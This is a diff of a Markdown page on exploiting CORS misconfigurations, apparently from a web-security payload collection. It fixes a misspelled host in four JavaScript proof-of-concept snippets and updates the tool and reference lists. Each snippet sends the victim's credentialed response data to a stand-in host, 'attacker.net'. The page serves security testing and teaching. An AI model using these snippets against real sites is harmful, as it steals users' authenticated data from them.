@@ -15,7 +15,7 @@
 * [chenjj/CORScanner - Fast CORS misconfiguration vulnerabilities scanner](https://github.com/chenjj/CORScanner)
 * [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)
 * [trufflesecurity/of-cors - Exploit CORS misconfigurations on the internal networks](https://github.com/trufflesecurity/of-cors) 
-
+* [omranisecurity/CorsOne - Fast CORS Misconfiguration Discovery Tool](https://github.com/omranisecurity/CorsOne) 
 
 ## Prerequisites
 
@@ -56,7 +56,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -174,7 +174,7 @@ req.open('get','https://api.internal.example.com/endpoint',true);
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -210,7 +210,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -243,7 +243,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -264,9 +264,9 @@ function reqListener() {
 
 ## References
 
-* [Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
-* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
-* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
-* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)
-* [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
-* [CORS Misconfigurations Explained - Detectify Blog](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
+- [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
+- [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
+- [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
+- [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
+- [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://portswigger.net/web-security/cors)
+- [CORS Misconfigurations Explained - Detectify Blog - Apr 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
